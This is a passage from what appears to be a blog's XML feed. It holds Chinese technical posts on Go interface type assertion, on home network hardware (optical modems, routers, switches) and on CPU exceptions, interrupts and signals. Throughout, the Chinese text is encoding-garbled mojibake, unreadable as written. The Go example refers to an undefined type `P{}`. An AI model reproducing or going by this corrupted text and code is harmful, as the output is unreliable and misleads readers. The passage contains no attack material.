<p>å¦‚æœæ˜¯ç»“æ„ä½“å®ç°æ¥å£è€Œç”¨æŒ‡é’ˆåˆå§‹åŒ–ï¼Œè°ƒç”¨æ—¶ç¼–è¯‘å™¨æ‹·è´æŒ‡é’ˆï¼Œæ–¹æ³•æ ˆå¸§ä¸­é€šè¿‡ <code>*</code> æ“ä½œå°±å¯ä»¥å¾—åˆ°åŸç»“æ„ä½“å¹¶æ‰§è¡Œå…¶æ–¹æ³•ï¼›è€Œå¦‚æœæ˜¯æŒ‡é’ˆå®ç°æ¥å£è€Œç”¨ç»“æ„ä½“åˆå§‹åŒ–ï¼Œè°ƒç”¨æ—¶ç¼–è¯‘å™¨åªèƒ½æ‹·è´ç»“æ„ä½“ï¼Œå³ä½¿åœ¨èƒŒåä½¿ç”¨ <code>&amp;</code> ä¹Ÿæ— æ³•å¾—åˆ°æŒ‡å‘åŸç»“æ„ä½“çš„æŒ‡é’ˆã€‚</p>
<h2 id="ç±»å‹æ–­è¨€"><a href="#ç±»å‹æ–­è¨€" class="headerlink" title="ç±»å‹æ–­è¨€"></a>ç±»å‹æ–­è¨€</h2><p>æœ‰æ—¶å€™æˆ‘ä»¬éœ€è¦ç¡®å®šæŸä¸ªæ¥å£å˜é‡çš„å…·ä½“ç±»å‹ï¼Œå°±éœ€è¦ç”¨åˆ°ç±»å‹æ–­è¨€ã€‚ç±»å‹æ–­è¨€å¯ä»¥æŠŠæ¥å£ç±»å‹è½¬ä¸ºå…·ä½“ç±»å‹ï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Tester <span class="keyword">interface</span>&#123;</span><br><span class="line">    test()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span> &#123;&#125;</span><br><span class="line"><span class="keyword">type</span> Cat <span class="keyword">struct</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p Person)</span> <span class="title">test</span><span class="params">()</span></span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> t Tester = P&#123;&#125;</span><br><span class="line">    <span class="keyword">switch</span> x := t.(<span class="keyword">type</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> Person:     <span class="comment">// è¿™é‡Œ x æ˜¯ Person ç±»å‹</span></span><br><span class="line">        <span class="keyword">case</span> Cat, <span class="keyword">int</span>:  <span class="comment">// è¿™é‡Œ x æ˜¯ interface&#123;&#125; ç±»å‹</span></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å‰é¢è¯´è¿‡æ— è®ºæ˜¯ <a href="https://github.com/golang/go/blob/6c64b6db6802818dd9a4789cdd564f19b70b6b4c/src/runtime/runtime2.go#L203">runtime.iface</a> è¿˜æ˜¯ <a href="https://github.com/golang/go/blob/6c64b6db6802818dd9a4789cdd564f19b70b6b4c/src/runtime/runtime2.go#L208">runtime.eface</a> éƒ½æœ‰ä¸ª <code>hash</code> å­—æ®µæ ‡è¯†æ¥å£çš„å…·ä½“ç±»å‹ï¼Œç±»å‹æ–­è¨€æ—¶ç¼–è¯‘å™¨æŠŠè¿™ä¸ªå­—æ®µå’Œç›®æ ‡ç±»å‹çš„å“ˆå¸Œå€¼è¿›è¡Œæ¯”è¾ƒå°±çŸ¥é“ä¸¤ä¸ªç±»å‹æ˜¯å¦ç›¸åŒäº†ã€‚</p>
<p>å‚è€ƒï¼š</p>
<p><a href="https://draveness.me/golang/">Goè¯­è¨€è®¾è®¡ä¸å®ç°</a></p>
<p><a href="https://i6448038.github.io/2018/10/01/Golang-interface/">Goè¯­è¨€interfaceåº•å±‚å®ç°</a></p>
<p>ã€ŠGoç¨‹åºè®¾è®¡è¯­è¨€ã€‹ç¬¬ä¸ƒç« </p>
]]></content>
      <categories>
        <category>è¯­è¨€</category>
      </categories>
      <tags>
        <tag>Go</tag>
      </tags>
  </entry>
  <entry>
    <title>å¤§è¯å…‰çŒ«ï¼Œè·¯ç”±å™¨ä¸äº¤æ¢æœº</title>
    <url>/2020/12/21/%E5%85%89%E7%8C%AB%EF%BC%8C%E8%B7%AF%E7%94%B1%E4%B8%8E%E4%BA%A4%E6%8D%A2%E6%9C%BA/</url>
    <content><![CDATA[<p>ç”Ÿæ´»ä¸­æœ€å¸¸è§çš„ç½‘ç»œè®¾å¤‡å°±æ˜¯å…‰çŒ«å’Œè·¯ç”±å™¨äº†ã€‚ä¸€äº›è¾ƒå¤§å‹çš„ä¼ä¸šå¯èƒ½è¿˜ä¼šç”¨åˆ°äº¤æ¢æœºã€‚ä»¥å®¶åº­ä¸Šç½‘ä¸ºä¾‹ï¼Œæ•°æ®ä»å…‰çº¤åˆ°è¾¾ä¸ªäººè®¾å¤‡çš„æµç¨‹æ˜¯è¿™æ ·çš„ï¼š</p>
<p><img src="https://i.loli.net/2020/12/21/fD5YlTFmNaG49hq.png" alt="è¾¹ç¼˜ç½‘ç»œæ¨¡å‹.png"></p>
<h2 id="å…‰çŒ«"><a href="#å…‰çŒ«" class="headerlink" title="å…‰çŒ«"></a>å…‰çŒ«</h2><p>ç°åœ¨å…‰çº¤å…¥æˆ·å·²ç»å¾ˆæ™®åŠäº†ï¼Œé¡¾åæ€ä¹‰å…‰çº¤æ˜¯é€šè¿‡å…‰ä¿¡å·æ¥ä¼ è¾“ä¿¡æ¯çš„ï¼Œè€Œæˆ‘ä»¬çš„ç»ˆç«¯è®¾å¤‡åªèƒ½å¤„ç†ç”µä¿¡å·ï¼Œé‚£ä¹ˆå¦‚ä½•å¤„ç†ä»å…‰ä¿¡å·åˆ°ç”µä¿¡å·çš„è½¬æ¢å‘¢ï¼Ÿç­”æ¡ˆå°±æ˜¯å…‰çŒ«(modem)ï¼Œé€šä¿—åœ°è®²ï¼Œå…‰çŒ«å°±æ˜¯ä¸€ç§è´Ÿè´£å…‰ç”µè½¬æ¢çš„è®¾å¤‡ã€‚ç”±äºå…‰çº¤å®½å¸¦æœ‰ä¸¤ç§æŠ€æœ¯æ¨¡å¼ï¼šä¸€ç§æ˜¯ EPON æ¥å…¥ï¼Œå¦ä¸€ç§æ˜¯ GPON æ¥å…¥ï¼Œæ‰€ä»¥å…‰çŒ«ä¹Ÿåˆ†ä¸º EPON å…‰çŒ«å’Œ GPON å…‰çŒ«ã€‚</p>
<p>ç”±äºä¸åŒåœ°åŒºã€ä¸åŒè¿è¥å•†å¾€å¾€ç”¨çš„éƒ½æ˜¯ä¸åŒçš„å…‰çº¤æŠ€æœ¯ï¼Œæ‰€ä»¥æ¯ä¸ªåœ°åŒºæ¯ä¸ªè¿è¥å•†å¯¹åº”çš„å…‰çŒ«ä¸€èˆ¬ä¹Ÿä¸åŒï¼Œæ¯”å¦‚ä¸€ä¸ªå…‰çŒ«åœ¨æ¹–å—è”é€šèƒ½æ­£å¸¸å·¥ä½œï¼Œè€Œåœ¨å¹¿ä¸œç§»åŠ¨å¯èƒ½å°±æ— æ³•ä½¿ç”¨äº†ã€‚æ‰€å¹¸åœ¨å…‰çº¤å…¥æˆ·çš„æ—¶å€™è¿è¥å•†ä¼šèµ é€ä¸€ä¸ªå¯¹åº”çš„å…‰çŒ«ã€‚å¦‚æœè¦è‡ªå·±åœ¨å¸‚åœºä¸Šè´­ä¹°å…‰çŒ«ï¼Œä¸€å®šè¦æ³¨æ„åœ°åŒºä¸è¿è¥å•†çš„é™åˆ¶ã€‚</p>
<p><img src="https://i.loli.net/2020/12/21/z8lVmEKRaeQZr7H.jpg" alt="çŒ«.jpg"></p>
<p>ä¸€èˆ¬æ¥è¯´ï¼Œåœ¨çŒ«èƒŒé¢çš„æ ‡ç­¾ä¸Šéƒ½ä¼šæ ‡æ˜äº†è®¾å¤‡çš„åç§°ã€å‹å·ä»¥åŠå…¶å®ƒå‚æ•°ã€‚ç”±äºå…‰çŒ«ä¸€èˆ¬éƒ½æ˜¯ç½‘ç»œè¿è¥å•†é…é€çš„ï¼Œæ‰€ä»¥å…‰çŒ«çš„æ ‡ç­¾ä¸Šé™¤äº†è®¾å¤‡å‹å·å’Œå‚æ•°å¤–ï¼Œé€šå¸¸è¿˜æ ‡æœ‰ç½‘ç»œè¿è¥å•†çš„æ ‡å¿—æˆ–LOGOç­‰</p>
<p><img src="https://i.loli.net/2020/12/21/3iSzyBoACfYHWnj.jpg" alt="çŒ«åº•.jpg"></p>
<p><img src="https://i.loli.net/2020/12/21/WuJfjkxUBtoanQY.jpg" alt="çŒ«èƒŒ.jpg"></p>
<h2 id="è·¯ç”±å™¨"><a href="#è·¯ç”±å™¨" class="headerlink" title="è·¯ç”±å™¨"></a>è·¯ç”±å™¨</h2><p>å¦‚ä»Šå„ç§è”ç½‘è®¾å¤‡è¶Šæ¥è¶Šå¤šï¼Œå¸¸è§çš„å°±æœ‰æ‰‹æœºã€ç”µè„‘ã€ipadï¼Œè¿˜æœ‰å„ç§å„æ ·çš„æ™ºèƒ½å®¶ç”µã€‚ä»…é ä¸€ä¸ªå…‰çŒ«æ˜¯æ— æ³•æ»¡è¶³è¿™ä¹ˆå¤šè®¾å¤‡çš„è”ç½‘éœ€æ±‚çš„ï¼ˆç«¯å£ä¸å¤Ÿï¼‰ï¼Œè€Œä¸”é€šå¸¸ä¹Ÿæ— æ³•å®ç°æ— çº¿ä¸Šç½‘ï¼ˆå½“ç„¶ç°åœ¨æœ‰å…‰çŒ«å’Œè·¯ç”±å™¨ä¸€ä½“çš„æœºå™¨ï¼Œè¿™é‡Œä¸åšè®¨è®ºï¼‰ã€‚è¿™å°±è¦ç”¨åˆ°è·¯ç”±å™¨(router)äº†ã€‚</p>
<p>ä¸“ä¸šä¸Šæ¥è¯´ï¼Œè·¯ç”±å™¨æ˜¯ä½äºç½‘ç»œå±‚çš„è®¾å¤‡ï¼Œè´Ÿè´£åœ¨å¤šä¸ªç½‘ç»œä¹‹é—´ä¼ è¾“æ•°æ®åŒ…ã€‚è·¯ç”±å™¨å†…éƒ¨ç»´æŠ¤äº†ä¸€å¼ è·¯ç”±è¡¨ï¼Œæ ¹æ®è·¯ç”±è¡¨å’Œä¸€äº›ç®—æ³•å†³å®šæŠŠæ•°æ®åŒ…å‘å¾€ä½•å¤„ï¼›å¯ä»¥ç»™å±€åŸŸç½‘åˆ†é… ip ï¼Œå³æŠŠä¸€ä¸ªå…¬æœ‰ ip åœ°å€è½¬æ¢ä¸ºå¤šä¸ªç§æœ‰ ip åœ°å€ï¼›å¦å¤–è¿˜ä¼šæä¾›é˜²ç«å¢™åŠŸèƒ½ã€‚</p>
<p>é€šä¿—åœ°è®²ï¼Œæœ‰äº†è·¯ç”±å™¨æˆ‘ä»¬å°±å¯ä»¥å®ç°å¤šå°è®¾å¤‡å…±ç”¨ä¸€ä¸ªè¿è¥å•†è´¦å·ï¼Œå¹¶ä¸”ä½¿ç”¨æ‰€è°“â€œWiFiâ€è¿›è¡Œæ— çº¿ä¸Šç½‘ã€‚</p>
<p><img src="https://i.loli.net/2020/12/21/Ag54uVlcSZy8ztf.png" alt="è·¯ç”±å™¨.png"></p>
<p><img src="https://i.loli.net/2020/12/21/oEtXeQFVPu6MLz9.png" alt="image.png"></p>
<h2 id="äº¤æ¢æœº"><a href="#äº¤æ¢æœº" class="headerlink" title="äº¤æ¢æœº"></a>äº¤æ¢æœº</h2><p>äº¤æ¢æœºå¯¹äºå®¶åº­ç”¨æˆ·è€Œè¨€å¯èƒ½æ¯”è¾ƒé™Œç”Ÿï¼Œå› ä¸ºå®ƒæ˜¯ä¸ºå¤šè®¾å¤‡äº’è”è€Œç”Ÿçš„ã€‚å°±åƒå‰é¢æ‰€è¯´ï¼Œå¦‚æœåœ¨ä¸€ä¸ªå…¬å¸é‡Œæœ‰ä¸Šç™¾å°è®¾å¤‡è¦è”ç½‘ï¼Œè¿™æ—¶å€™è·¯ç”±å™¨ä¹Ÿä¸å¤Ÿç”¨äº†ï¼Œå°±éœ€è¦ä½¿ç”¨äº¤æ¢æœº(switch)ã€‚</p>
<p>äº¤æ¢æœºå°±æ˜¯åœ¨å¤šä¸ªç«¯å£ä¹‹é—´äº¤æ¢æ•°æ®ï¼Œä¸è·¯ç”±å™¨ä¸åŒï¼Œå®ƒæ˜¯ä¸€ä¸ªé“¾è·¯å±‚çš„è®¾å¤‡ï¼Œé€šè¿‡åˆ¤æ–­ MAC åœ°å€æ¥å†³å®šæ•°æ®å‘å¾€å“ªå°è®¾å¤‡ã€‚å®ƒä¸å…·æœ‰åˆ†é… ipã€é˜²ç«å¢™ç­‰åŠŸèƒ½ï¼Œä»…è´Ÿè´£åœ¨ç«¯å£ä¹‹é—´äº¤æ¢æ•°æ®åŒ…ï¼Œå°±åƒæ˜¯åå­—è·¯å£çš„äº¤è­¦ï¼Œåœ¨å±€åŸŸç½‘å†…å¯¹æ•°æ®æµè½¬èµ·åˆ°ä¸€ä¸ªæŒ‡æŒ¥ä½œç”¨ã€‚</p>
<p>äº¤æ¢æœºå…¨éƒ¨æ¥å£éƒ½æ˜¯ä¸€æ ·çš„ï¼Œæ²¡æœ‰ WLAN å£å’Œ VLAN å£ä¹‹åˆ†ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œå½“è·¯ç”±å™¨çš„ç½‘å£ä¸å¤Ÿç”¨çš„æ—¶å€™ï¼Œå¯ä»¥å†æ¥å…¥ä¸€ä¸ªäº¤æ¢æœºæ¥æ‰©å±•ç½‘å£ã€‚ä»æ— çº¿è·¯ç”±å™¨çš„ VLAN å£ä¸Šæ¥ä¸€æ¡ç½‘çº¿åˆ°äº¤æ¢æœºä»»æ„æ¥å£ï¼Œç„¶åä»äº¤æ¢æœºçš„å…¶ä»–æ¥å£å¯ä»¥æ¥åˆ°ç”µè„‘ç­‰è®¾å¤‡ä¸Šã€‚</p>
<p><img src="https://i.loli.net/2020/12/21/aPJUZMH8Fen5rhg.png" alt="äº¤æ¢æœº.png"></p>
]]></content>
      <categories>
        <category>è®¡ç®—æœºç½‘ç»œ</category>
      </categories>
      <tags>
        <tag>ç¡¬ä»¶</tag>
      </tags>
  </entry>
  <entry>
    <title>å¼‚å¸¸ã€ä¸­æ–­ä¸ä¿¡å·</title>
    <url>/2020/12/12/%E5%BC%82%E5%B8%B8%E3%80%81%E4%B8%AD%E6%96%AD%E4%B8%8E%E4%BF%A1%E5%8F%B7/</url>
    <content><![CDATA[<p>ä»»ä½•ä¸€ä¸ªé€šç”¨ CPU éƒ½å¯ä»¥åœ¨æ‰§è¡Œå®Œä¸€æ¡æŒ‡ä»¤åæ£€æµ‹ä» CPU å¤–éƒ¨å‘é€è¿‡æ¥æˆ–ä»å†…éƒ¨äº§ç”Ÿçš„ä¸€ç§ç‰¹æ®Šä¿¡æ¯ï¼Œå¹¶ä¸”å¯ä»¥ç«‹å³è½¬è€Œå¯¹è¯¥ä¿¡æ¯è¿›è¡Œå¤„ç†ã€‚è¿™ç§â€œç‰¹æ®Šä¿¡æ¯â€è¡ç”Ÿå‡ºäº†å¼‚å¸¸ã€ä¸­æ–­å’Œä¿¡å·è¿™ä¸‰ä¸ªæ¦‚å¿µï¼Œå…¶ä¸­ç‰µæ¶‰åˆ°çš„çŸ¥è¯†ç‚¹éå¸¸å¹¿æ³›ä¸”å¤æ‚ï¼Œç¯ç¯ç›¸æ‰£ã€‚æœ¬æ–‡æ—¨åœ¨å¯¹å…¶è¿›è¡Œæ¢³ç†ï¼Œå½¢æˆä¸€ä¸ªè„‰ç»œï¼Œå…·ä½“åº•å±‚ç»†èŠ‚è¿˜éœ€è¦è¯»è€…è‡ªè¡Œæ¢ç©¶ã€‚</p>
<h2 id="å®šä¹‰"><a href="#å®šä¹‰" class="headerlink" title="å®šä¹‰"></a>å®šä¹‰</h2><blockquote>
<p>ä¸­æ–­ï¼ˆåˆç§°å¼‚æ­¥ä¸­æ–­ã€ç¡¬ä¸­æ–­ï¼‰: æœ¬è´¨æ˜¯ä¸€ç§ç”µä¿¡å·ã€‚å½“è®¾å¤‡æœ‰æŸç§äº‹ä»¶å‘ç”Ÿæ—¶ï¼Œå®ƒå°±ä¼šäº§ç”Ÿä¸­æ–­ï¼Œé€šè¿‡æ€»çº¿æŠŠç”µä¿¡å·å‘é€ç»™ä¸­æ–­æ§åˆ¶å™¨ï¼ˆå¦‚ 8259Aï¼‰ã€‚å¦‚æœä¸­æ–­çš„çº¿æ˜¯æ¿€æ´»çš„ï¼Œä¸­æ–­æ§åˆ¶å™¨å°±æŠŠç”µä¿¡å·å‘é€ç»™å¤„ç†å™¨çš„æŸä¸ªç‰¹å®šå¼•è„šã€‚å¤„ç†å™¨äºæ˜¯ç«‹å³åœæ­¢è‡ªå·±æ­£åœ¨åšçš„äº‹ï¼Œè·³åˆ°ä¸­æ–­å¤„ç†ç¨‹åºçš„å…¥å£ç‚¹ï¼Œè¿›è¡Œä¸­æ–­å¤„ç†ã€‚</p>
</blockquote>
<blockquote>
<p>å¼‚å¸¸ï¼ˆåˆç§°åŒæ­¥ä¸­æ–­ï¼Œè½¯ä¸­æ–­ï¼‰ï¼šç”±æŒ‡ä»¤äº§ç”Ÿï¼Œå¦‚ div æŒ‡ä»¤ä¸­é™¤æ•°ä¸º 0 å°±ä¼šå¼•å‘ä¸€ä¸ªé™¤é›¶å¼‚å¸¸ã€‚å¼‚å¸¸æ˜¯å¯ä»¥é¢„æœŸçš„ï¼Œé€šè¿‡è§‚å¯Ÿç¨‹åºçš„æŒ‡ä»¤å°±å¯ä»¥çŸ¥é“ä»€ä¹ˆæ—¶å€™ä¼šäº§ç”Ÿä»€ä¹ˆå¼‚å¸¸ã€‚</p>
</blockquote>
<p>ä¸­æ–­å’Œå¼‚å¸¸éƒ½æ˜¯ç”¨ç§°ä¸º <code>ä¸­æ–­ç±»å‹ç </code> æ¥è¡¨ç¤ºä¸­æ–­ä¿¡æ¯çš„æ¥æºã€‚ä¸­æ–­ç±»å‹ç æ˜¯ä¸€ä¸ªå­—èŠ‚å‹æ•°æ®ï¼Œå¯ä»¥è¡¨ç¤º 256 ç§æ¥æºã€‚</p>
<blockquote>
<p>ä¿¡å·ï¼šä¿¡å·æ˜¯è½¯ä»¶å±‚é¢ä¸Šå¯¹ä¸­æ–­çš„æ¨¡æ‹Ÿï¼Œç”¨æ¥é€šçŸ¥è¿›ç¨‹å‘ç”Ÿäº†å¼‚æ­¥äº‹ä»¶ã€‚è¿›ç¨‹ä¹‹é—´å¯ä»¥é€šè¿‡ç³»ç»Ÿè°ƒç”¨å‘é€è½¯ä¸­æ–­ä¿¡å·ã€‚å†…æ ¸ä¹Ÿå¯ä»¥å› ä¸ºå†…éƒ¨äº‹ä»¶ç»™è¿›ç¨‹å‘é€ä¿¡å·ï¼Œé€šçŸ¥è¿›ç¨‹å‘ç”Ÿäº†æŸä¸ªäº‹ä»¶ã€‚æ³¨æ„ï¼Œä¿¡å·åªæ˜¯ç”¨æ¥é€šçŸ¥æŸè¿›ç¨‹å‘ç”Ÿäº†ä»€ä¹ˆäº‹ä»¶ï¼Œå¹¶ä¸ç»™è¯¥è¿›ç¨‹ä¼ é€’ä»»ä½•æ•°æ®</p>
</blockquote>
<h2 id="å¼‚å¸¸ä¸ä¸­æ–­"><a href="#å¼‚å¸¸ä¸ä¸­æ–­" class="headerlink" title="å¼‚å¸¸ä¸ä¸­æ–­"></a>å¼‚å¸¸ä¸ä¸­æ–­</h2><p>æˆ‘ä»¬å…ˆæ¥çœ‹çœ‹å¼‚å¸¸ã€‚åˆšæ‰è¯´åˆ°ï¼Œå¼‚å¸¸ç”±æŒ‡ä»¤è§¦å‘ï¼Œä¹Ÿå°±æ˜¯ä»£è¡¨äº†æ¥è‡ªç¨‹åºå†…éƒ¨çš„æŸäº›è¡Œä¸ºï¼Œè¿™äº›è¡Œä¸ºæ€»ä½“å¯ä»¥åˆ†ä¸ºå››ç±»ï¼š</p>
<ol>
<li>é™¤æ³•é”™è¯¯ï¼Œå¦‚é™¤é›¶ã€‚ç±»å‹ç ï¼š0</li>
<li>å•æ­¥æ‰§è¡Œã€‚ç±»å‹ç ï¼š1</li>
<li>æ‰§è¡Œ into æŒ‡ä»¤ã€‚ç±»å‹ç ï¼š4</li>
<li>æ‰§è¡Œ int n æŒ‡ä»¤ã€‚ç±»å‹ç ï¼šn</li>
</ol>
<p>å¼‚å¸¸å¤„ç†æµç¨‹ï¼š</p>
<ol>
<li>å¼‚å¸¸å‘ç”Ÿï¼Œæ§åˆ¶å•å…ƒäº§ç”Ÿä¸€ä¸ªå¯¹åº”çš„ç±»å‹ç </li>
<li>CPU æ ¹æ®è¿™ä¸ªç±»å‹ç ä»ä¸­æ–­å‘é‡è¡¨(idt, interrupt description table) æ‰¾åˆ°å¼‚å¸¸å¤„ç†å¤„ç†ç¨‹åºå…¥å£</li>
<li>ä¿å­˜å½“å‰ç¨‹åºç°åœºï¼Œåˆ‡æ¢åˆ°å¯¹åº”å¼‚å¸¸å¤„ç†ç¨‹åº</li>
<li>å¼‚å¸¸å¤„ç†ç¨‹åºæœ€åå‘è¿›ç¨‹å‘é€ä¸€ä¸ªä¿¡å· SIGXXXï¼Œè®°å½•åœ¨è¿›ç¨‹çš„ PCB é‡Œ</li>
<li>å¦‚æœè¿›ç¨‹è‡ªå®šä¹‰äº†è¯¥ä¿¡å·çš„å¤„ç†ç¨‹åºï¼Œè·³å»æ‰§è¡Œå®ƒï¼›å¦åˆ™æ‰§è¡Œå†…æ ¸é¢„å®šä¹‰çš„è¡Œä¸º</li>
</ol>
<p><img src="https://i.loli.net/2020/12/13/g6Z8DEmK7XjsPJB.png" alt="å¼‚å¸¸å¤„ç†æµç¨‹.png"></p>
<p><strong>å¼‚å¸¸éƒ½æ˜¯ä¸å¯å±è”½çš„ï¼ŒCPU å¿…é¡»å¯¹æ­¤åšå‡ºå“åº”ã€‚</strong></p>
<p>å†æ¥çœ‹ä¸­æ–­ã€‚å½“ CPU å¤–éƒ¨æœ‰éœ€è¦å¤„ç†çš„äº‹æƒ…å‘ç”Ÿï¼ˆå¦‚å¤–è®¾è¾“å…¥è¾“å‡ºç­‰ï¼‰ï¼Œä¸­æ–­æ§åˆ¶å™¨ä¼šå‘ CPU å‘å‡ºå¯¹åº”çš„ä¸­æ–­ç±»å‹ç ï¼Œå¼•å‘ä¸­æ–­è¿‡ç¨‹ã€‚ä¸­æ–­åˆå¯ä»¥åˆ†ä¸ºä¸¤ç±»ï¼š</p>
<ol>
<li>å¯å±è”½ä¸­æ–­ï¼šCPU å¯ä»¥ä¸å“åº”è¿™ä¸ªä¸­æ–­ã€‚è€Œå…·ä½“å“ä¸å“åº”è¦çœ‹æ ‡å¿—å¯„å­˜å™¨çš„ IF ä½ã€‚IF = 1 æ—¶ CPU æ‰§è¡Œå®Œå½“å‰æŒ‡ä»¤åå“åº”ä¸­æ–­ï¼ŒIF = 0 åˆ™ä¸å“åº”ã€‚å¤šæ•°ç”± IO å¼•å‘çš„ä¸­æ–­éƒ½æ˜¯å¯å±è”½çš„ã€‚</li>
<li>ä¸å¯å±è”½ä¸­æ–­ï¼šCPU å¿…é¡»å“åº”çš„ä¸­æ–­ã€‚CPU æ‰§è¡Œå®Œå½“å‰æŒ‡ä»¤åç«‹åˆ»å¼•å‘ä¸­æ–­è¿‡ç¨‹ã€‚å®ƒçš„ç±»å‹ç å›ºå®šä¸º 2ã€‚å­˜å‚¨å™¨æ ¡éªŒå‡ºé”™ï¼ŒI/O é€šé“æ ¡éªŒå‡ºé”™ç­‰éƒ½å±äºä¸å¯å±è”½ä¸­æ–­ã€‚</li>
</ol>
<p>ä¸­æ–­å¤„ç†æµç¨‹ï¼š</p>
<ol>
<li>è®¾å¤‡äº§ç”Ÿä¸­æ–­ï¼ŒPIC(å¯ç¼–ç¨‹ä¸­æ–­æ§åˆ¶å™¨)äº§ç”Ÿä¸€ä¸ªå¯¹åº”çš„ç±»å‹ç </li>
<li>CPU æ ¹æ®è¿™ä¸ªç±»å‹ç ä»ä¸­æ–­å‘é‡è¡¨(idt, interrupt description table) æ‰¾åˆ°å¼‚å¸¸å¤„ç†å¤„ç†ç¨‹åºå…¥å£</li>
<li>ä¿å­˜å½“å‰ç¨‹åºç°åœºï¼Œåˆ‡æ¢åˆ°å¯¹åº”å¼‚å¸¸å¤„ç†ç¨‹åº</li>
<li>ä¸­æ–­å¤„ç†ç¨‹åºè¿›è¡Œä¿å­˜ç°åœºï¼Œåšç›¸å…³å¤„ç†ï¼Œæ¢å¤ç°åœº</li>
<li>å†…æ ¸è°ƒåº¦ï¼Œè¿”å›ç”¨æˆ·è¿›ç¨‹</li>
</ol>
<p><img src="https://i.loli.net/2020/12/13/Ra5TtVXK2YmjzPG.png" alt="ä¸­æ–­å¤„ç†æµç¨‹.png"></p>
<p>ç°ä»£æ“ä½œç³»ç»ŸæŠŠä¸­æ–­å¤„ç†ç¨‹åºä»æ¦‚å¿µä¸Šè¢«åˆ†ä¸º<code>ä¸Šåº•ï¼ˆtop halfï¼‰</code>å’Œ<code>ä¸‹åº•ï¼ˆbottom halfï¼‰</code>ã€‚åœ¨ä¸­æ–­å‘ç”Ÿæ—¶ä¸ŠåŠéƒ¨åˆ†çš„å¤„ç†è¿‡ç¨‹ç«‹å³æ‰§è¡Œï¼Œä½†æ˜¯ä¸‹åŠéƒ¨åˆ†ï¼ˆå¦‚æœæœ‰çš„è¯ï¼‰å´æ¨è¿Ÿæ‰§è¡Œã€‚å†…æ ¸æŠŠä¸ŠåŠéƒ¨åˆ†å’Œä¸‹åŠéƒ¨åˆ†ä½œä¸ºç‹¬ç«‹çš„å‡½æ•°æ¥å¤„ç†ï¼Œä¸ŠåŠéƒ¨åˆ†å†³å®šå…¶ç›¸å…³çš„ä¸‹åŠéƒ¨åˆ†æ˜¯å¦éœ€è¦æ‰§è¡Œã€‚å¿…é¡»ç«‹å³æ‰§è¡Œçš„éƒ¨åˆ†å¿…é¡»ä½äºä¸ŠåŠéƒ¨åˆ†ï¼Œè€Œå¯ä»¥æ¨è¿Ÿçš„éƒ¨åˆ†å¯èƒ½å±äºä¸‹åŠéƒ¨åˆ†ã€‚ä¸¤è€…é€šè¿‡è½¯ä¸­æ–­è¡”æ¥ã€‚æ¯”å¦‚ï¼Œç½‘å¡æ¥æ”¶æ•°æ®çš„è¿‡ç¨‹ä¸­ï¼Œé¦–å…ˆç½‘å¡å‘é€ä¸­æ–­ä¿¡å·å‘Šè¯‰ CPU æ¥å–æ•°æ®å¹¶ç”¨ DMA æŠ€æœ¯æŠŠæ•°æ®åŒ…å†™å…¥å†…å­˜ï¼Œç„¶å CPU è°ƒç”¨ç½‘å¡é©±åŠ¨å…ˆç¦ç”¨ç½‘å¡ä¸­æ–­ï¼Œå†æŠŠåŸå§‹æ•°æ®åŒ…è§£ææˆåè®®æ ˆå¯¹åº”çš„æ ¼å¼ï¼Œæœ€åé€å…¥å„å±‚ä¾æ¬¡è§£æã€‚è¿™äº›å¦‚æœéƒ½è®©ä¸­æ–­å¤„ç†ç¨‹åºæ¥å¤„ç†æ˜¾ç„¶è¿‡ç¨‹å¤ªé•¿ï¼Œé€ æˆæ–°æ¥çš„ä¸­æ–­é˜»å¡ã€‚å› æ­¤ Linux å°†è¿™ç§ä»»åŠ¡åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†ï¼Œä¸€ä¸ªå«ä¸Šåº•ï¼Œå³ä¸­æ–­å¤„ç†ç¨‹åºï¼ŒçŸ­å¹³å¿«åœ°å¤„ç†ä¸ç¡¬ä»¶ç›¸å…³çš„æ“ä½œï¼ˆå¦‚ç¦ç”¨ç½‘å¡ä¸­æ–­ï¼‰ï¼›è€ŒæŠŠå¯¹æ—¶é—´è¦æ±‚ç›¸å¯¹å®½æ¾çš„ä»»åŠ¡ï¼ˆå¦‚è§£ææ•°æ®çš„å·¥ä½œï¼‰æ”¾åœ¨å¦ä¸€ä¸ªéƒ¨åˆ†æ‰§è¡Œã€‚</p>
<p>ä¸ºä»€ä¹ˆè¦è¿™æ ·åˆ’åˆ†ä¸ºä¸¤éƒ¨åˆ†å‘¢ï¼Ÿ</p>
<ol>
<li>æŠŠä¸­æ–­çš„æ€»å»¶è¿Ÿæ—¶é—´æœ€å°åŒ–ã€‚Linux å†…æ ¸å®šä¹‰äº†ä¸¤ç§ç±»å‹çš„ä¸­æ–­ï¼Œå¿«é€Ÿçš„å’Œæ…¢é€Ÿçš„ï¼Œè¿™ä¸¤è€…ä¹‹é—´çš„ä¸€ä¸ªåŒºåˆ«æ˜¯æ…¢é€Ÿä¸­æ–­è‡ªèº«è¿˜å¯ä»¥è¢«ä¸­æ–­ï¼Œè€Œå¿«é€Ÿä¸­æ–­åˆ™ä¸èƒ½ã€‚å› æ­¤ï¼Œå½“å¤„ç†å¿«é€Ÿä¸­æ–­æ—¶ï¼Œå¦‚æœæœ‰å…¶å®ƒä¸­æ–­åˆ°è¾¾ï¼›ä¸ç®¡æ˜¯å¿«é€Ÿä¸­æ–­è¿˜æ˜¯æ…¢é€Ÿä¸­æ–­ï¼Œå®ƒä»¬éƒ½å¿…é¡»ç­‰å¾…ã€‚ä¸ºäº†å°½å¯èƒ½å¿«åœ°å¤„ç†è¿™äº›å…¶å®ƒçš„ä¸­æ–­ï¼Œå†…æ ¸å°±éœ€è¦å°½å¯èƒ½åœ°å°†å¤„ç†å»¶è¿Ÿåˆ°ä¸‹åŠéƒ¨åˆ†æ‰§è¡Œã€‚</li>
